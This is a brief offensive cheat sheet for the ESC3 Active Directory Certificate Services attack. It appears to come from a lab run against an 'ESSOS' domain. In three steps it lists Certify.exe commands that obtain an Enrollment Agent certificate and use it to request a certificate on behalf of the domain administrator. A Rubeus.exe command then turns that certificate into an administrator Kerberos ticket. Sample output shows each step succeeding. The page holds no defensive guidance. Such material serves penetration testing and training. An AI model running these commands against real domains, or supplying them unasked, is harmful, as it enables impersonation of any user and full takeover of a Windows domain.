title: ESC3: Enrollment Agent Templates
html:
Attack flow: Request an Enrollment Agent certificate → use it to request a certificate on behalf of any user → authenticate as that user.

Step 1 — Request Enrollment Agent Certificate

Certify.exe request /ca:<ca-host>\<ca-name> /template:EnrollmentAgent
Certify.exe request /ca:<domain>\<ca> /template:EnrollmentAgent

[*] Current user context    : ESSOS\<username>
[*] Template                : EnrollmentAgent
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 9

Step 2 — Request Certificate On Behalf of Target

Certify.exe request /ca:<ca-host>\<ca-name> /template:User /onbehalfof:<domain>\<target-user> /enrollcert:agent.pfx /enrollcertpw:mimikatz
Certify.exe request /ca:<domain>\<ca> /template:User /onbehalfof:ESSOS\administrator /enrollcert:agent.pfx /enrollcertpw:mimikatz

[*] Action: Request a Certificates on behalf of another user
[*] On behalf of            : ESSOS\administrator
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 10

Step 3 — Authenticate as Target

Rubeus.exe asktgt /user:<target-user> /certificate:<target-user>.pfx
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx

[+] TGT request successful!

  UserName                 : administrator
  UserRealm                : <domain>
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
